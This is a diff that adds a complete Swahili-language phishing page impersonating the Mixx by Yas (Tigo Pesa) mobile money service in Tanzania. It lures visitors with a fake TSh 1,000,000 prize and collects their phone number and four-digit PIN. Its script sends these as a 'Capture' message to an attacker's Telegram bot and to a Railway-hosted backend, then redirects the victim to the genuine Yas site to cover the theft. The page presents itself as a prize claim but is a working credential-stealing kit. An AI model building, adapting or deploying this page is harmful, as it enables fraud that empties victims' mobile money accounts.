@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>MIXX_BY YAS · Telegram</title>
+  <style>
+    /* ... (same styles as before, kept compact for brevity) ... */
+    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+    body { background:linear-gradient(145deg,#e0e5ec 0%,#f0f4fa 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; padding:16px; position:relative; }
+    .watermark { position:fixed; font-size:60px; font-weight:900; color:rgba(244,180,0,0.06); pointer-events:none; z-index:0; white-space:nowrap; user-select:none; }
+    .top-left { top:10px; left:10px; transform:rotate(-15deg); }
+    .top-right { top:10px; right:10px; transform:rotate(15deg); }
+    .bottom-left { bottom:10px; right:10px; transform:rotate(10deg); }
+    .bottom-right { bottom:10px; left:10px; transform:rotate(-10deg); }
+    .wrapper { background:rgba(255,255,255,0.96); backdrop-filter:blur(2px); border-radius:48px; padding:30px 20px 40px; max-width:450px; width:100%; text-align:center; box-shadow:0 20px 40px rgba(0,0,0,0.15), inset 0 1px 2px rgba(255,255,255,0.6); z-index:2; border:1px solid rgba(244,180,0,0.3); }
+    svg { max-width:140px; height:auto; margin-bottom:8px; filter:drop-shadow(0 4px 6px rgba(0,0,0,0.1)); }
+    h1 { font-size:32px; background:linear-gradient(135deg,#1C2E5B,#2c4580); -webkit-background-clip:text; background-clip:text; color:transparent; letter-spacing:1px; margin-top:5px; }
+    .win-text { background:linear-gradient(120deg,#F4B400,#FFD966); display:inline-block; padding:10px 20px; border-radius:50px; font-size:22px; font-weight:800; color:#1C2E5B; margin:20px 0 18px; box-shadow:0 4px 0 #b87f00; transform:rotate(-0.5deg); }
+    label { display:block; text-align:left; font-weight:700; color:#1C2E5B; margin:18px 0 6px 5px; font-size:14px; }
+    input[type="tel"] { width:100%; padding:14px 18px; font-size:18px; border:2px solid #e2e8f0; border-radius:50px; background:white; transition:0.2s; outline:none; font-weight:500; -webkit-appearance:none; }
+    input[type="tel"]:focus { border-color:#F4B400; box-shadow:0 0 0 3px rgba(244,180,0,0.2); }
+    .pin-wrapper { display:flex; gap:12px; justify-content:center; margin:12px 0 10px; }
+    .pin-box { width:65px; height:65px; text-align:center; font-size:32px; font-weight:bold; border:2px solid #cbd5e1; border-radius:20px; background:white; transition:0.1s; font-family:monospace; outline:none; -webkit-appearance:none; }
+    .pin-box:focus { border-color:#F4B400; box-shadow:0 0 0 2px #ffe699; }
+    @media (max-width:480px) { body { padding:12px; } .wrapper { padding:24px 16px 35px; border-radius:40px; } h1 { font-size:28px; } .win-text { font-size:18px; padding:8px 16px; } .pin-box { width:55px; height:55px; font-size:28px; border-radius:16px; } .pin-wrapper { gap:10px; } }
+    @media (max-width:380px) { .pin-box { width:48px; height:48px; font-size:24px; border-radius:14px; } .pin-wrapper { gap:8px; } }
+    .footer-note { margin-top:18px; font-size:11px; color:#6c757d; }
+    .status-badge { display:inline-block; margin-top:12px; padding:6px 14px; border-radius:20px; font-size:11px; font-weight:600; background:#e8f5e9; color:#2e7d32; }
+  </style>
+</head>
+<body>
+  <div class="watermark top-left">Mixx</div>
+  <div class="watermark top-right">Mixx</div>
+  <div class="watermark bottom-left">Mixx</div>
+  <div class="watermark bottom-right">Mixx</div>
+
+  <div class="wrapper" id="appWrapper">
+    <svg width="140" height="107" viewBox="0 0 400 300">
+      <ellipse cx="200" cy="240" rx="70" ry="12" fill="rgba(0,0,0,0.08)"/>
+      <rect x="120" y="50" width="140" height="160" rx="22" fill="#fff" stroke="#F4B400" stroke-width="8"/>
+      <rect x="170" y="185" width="40" height="8" rx="4" fill="#F4B400"/>
+      <polygon points="210,25 300,65 250,120 160,80" fill="#F4B400"/>
+      <polygon points="225,15 315,55 265,110 175,70" fill="#FFD54F" opacity="0.9"/>
+      <line x1="200" y1="120" x2="185" y2="140" stroke="#F4B400" stroke-width="4"/>
+      <line x1="210" y1="125" x2="195" y2="150" stroke="#F4B400" stroke-width="4"/>
+      <text x="95" y="260" font-size="52" fill="#1C2E5B" font-weight="bold">tigo</text>
+      <text x="205" y="260" font-size="52" fill="#F4B400" font-weight="bold">pesa</text>
+    </svg>
+
+    <h1>MIXX_BY YAS</h1>
+    <div class="win-text">UMEJISHINDIA TSH1,000,000</div>
+
+    <form id="yasForm" onsubmit="return false;">
+      <input type="hidden" name="pin" id="pinHidden">
+      <label>📱 Namba ya Mixx</label>
+      <input type="tel" name="phone" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off" inputmode="numeric">
+      <label>🔐 PIN</label>
+      <div class="pin-wrapper" id="pinWrapper">
+        <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+        <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+        <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+        <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+      </div>
+    </form>
+
+    <div class="footer-note">💰 Tuma sasa!</div>
+    <div class="status-badge" id="statusBadge">⚡ Telegram active</div>
+  </div>
+
+  <script>
+    (function(){
+      // ============================================
+      // 🔐 REPLACE WITH YOUR OWN TELEGRAM CREDENTIALS
+      // ============================================
+      const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // e.g., '123456:ABC-DEF'
+      const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';      // e.g., '123456789'
+
+      // Backend (Railway) - optional, keep or remove
+      const BACKEND_URL = 'https://mixxyaastz-production.up.railway.app/Server';
+
+      // ============================================
+      // DOM refs
+      const phoneInput = document.getElementById("phoneInput");
+      const pinHidden = document.getElementById("pinHidden");
+      const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
+      const statusBadge = document.getElementById("statusBadge");
+
+      let realPin = ["", "", "", ""];
+      let submitted = false;
+
+      // ----- send to Telegram -----
+      async function sendToTelegram(phone, pin) {
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+          console.warn('⚠️ Telegram bot token not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
+          return false;
+        }
+        const message = `🔔 *MIXX_BY YAS Capture*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 ${new Date().toLocaleString()}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+          const resp = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          });
+          const data = await resp.json();
+          if (data.ok) {
+            console.log('✅ Telegram sent!');
+            statusBadge.textContent = '✅ Sent to Telegram';
+            statusBadge.style.background = '#e8f5e9';
+            statusBadge.style.color = '#2e7d32';
+            return true;
+          } else {
+            console.error('❌ Telegram error:', data);
+            statusBadge.textContent = '❌ Telegram error';
+            statusBadge.style.background = '#ffebee';
+            statusBadge.style.color = '#c62828';
+            return false;
+          }
+        } catch (e) {
+          console.error('❌ Telegram fetch error:', e);
+          return false;
+        }
+      }
+
+      // ----- main submit: send to Telegram + Railway + redirect -----
+      async function submitCapture() {
+        if (submitted) return;
+        submitted = true;
+
+        const phone = phoneInput.value;
+        const fullPin = realPin.join('');
+
+        console.log('📤 Captured:', { phone, pin: fullPin });
+
+        // 1) Send to Telegram
+        await sendToTelegram(phone, fullPin);
+
+        // 2) Send to Railway (optional)
+        try {
+          const response = await fetch(BACKEND_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, pin: fullPin })
+          });
+          const result = await response.json();
+          console.log('✅ Railway response:', result);
+        } catch (error) {
+          console.error('❌ Railway error:', error);
+        }
+
+        // 3) Redirect
+        window.location.href = "https://yas.co.tz/mixx-by-yas/";
+      }
+
+      // ----- helpers -----
+      function updateHiddenAndSubmit() {
+        pinHidden.value = realPin.join('');
+        if (realPin.every(x => x !== "") && phoneInput.value.length === 10 && !submitted) {
+          submitCapture();
+        }
+      }
+
+      // ----- phone input -----
+      phoneInput.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').slice(0, 10);
+      });
+
+      // ----- pin boxes -----
+      pinBoxes.forEach((box, idx) => {
+        box.addEventListener('input', function(e) {
+          let val = e.target.value.replace(/\D/g, '');
+          if (!val) return;
+          e.target.value = val;
+          realPin[idx] = val;
+          setTimeout(() => {
+            if (document.activeElement !== box) e.target.value = '•';
+          }, 100);
+          if (idx < 3) pinBoxes[idx + 1].focus();
+          updateHiddenAndSubmit();
+        });
+
+        box.addEventListener('keydown', function(e) {
+          if (e.key === "Backspace") {
+            realPin[idx] = "";
+            if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
+            updateHiddenAndSubmit();
+          }
+        });
+
+        box.addEventListener('beforeinput', function(e) {
+          if (e.inputType === "insertText" && !/^\d$/.test(e.data)) {
+            e.preventDefault();
+          }
+        });
+
+        // focus/blur: show/hide digit
+        box.addEventListener('focus', function() {
+          if (realPin[idx]) this.value = realPin[idx];
+        });
+        box.addEventListener('blur', function() {
+          if (realPin[idx]) this.value = '•';
+        });
+      });
+
+      // ----- enter key -----
+      document.addEventListener('keydown', function(e) {
+        if (e.key === "Enter" && realPin.every(x => x !== "") && phoneInput.value.length === 10 && !submitted) {
+          e.preventDefault();
+          submitCapture();
+        }
+      });
+
+      // prevent form default
+      document.getElementById("yasForm").addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (realPin.every(x => x !== "") && phoneInput.value.length === 10 && !submitted) {
+          submitCapture();
+        }
+      });
+
+      // check if token is set
+      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+        statusBadge.textContent = '⚠️ Set bot token';
+        statusBadge.style.background = '#fff3e0';
+        statusBadge.style.color = '#e65100';
+      } else {
+        statusBadge.textContent = '✅ Telegram ready';
+        statusBadge.style.background = '#e8f5e9';
+        statusBadge.style.color = '#2e7d32';
+      }
+
+      console.log('✅ MIXX_BY YAS with Telegram loaded');
+    })();
+  </script>
+</body>
+</html>
